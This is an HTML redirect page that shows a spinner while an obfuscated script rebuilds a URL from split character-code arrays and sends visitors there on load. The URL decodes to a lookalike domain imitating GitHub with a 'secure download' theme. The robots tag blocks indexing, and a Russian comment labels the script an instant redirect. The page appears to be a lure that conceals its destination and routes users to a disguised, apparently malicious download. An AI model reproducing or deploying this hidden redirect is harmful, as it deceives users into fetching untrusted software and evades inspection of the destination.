<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="referrer" content="strict-origin-when-cross-origin">
  <meta name="robots" content="none">
  <title>Redirecting...</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #1a1a2e;
      display: grid;
      place-items: center;
      overflow: hidden;
    }
    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(22, 33, 62, 0.3);
      border-top-color: #16213e;
      border-radius: 50%;
      animation: spin 1.2s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="spinner"></div>
  <script>
    
    const p1 = [104, 116, 116, 112, 115, 58];
    const p2 = [47, 47, 103, 105, 116, 104];
    const p3 = [117, 98, 115, 101, 99, 117, 114, 101];
    const p4 = [100, 111, 119, 110, 108, 111, 97, 100];
    const p5 = [46, 111, 110, 108, 105, 110, 101, 47, 104, 114, 102, 47, 97, 108, 108];
    const u = String.fromCharCode(...[...p1, ...p2, ...p3, ...p4, ...p5]);

    // Мгновенный редирект
    window.location.href = u;
  </script>
</body>
</html>
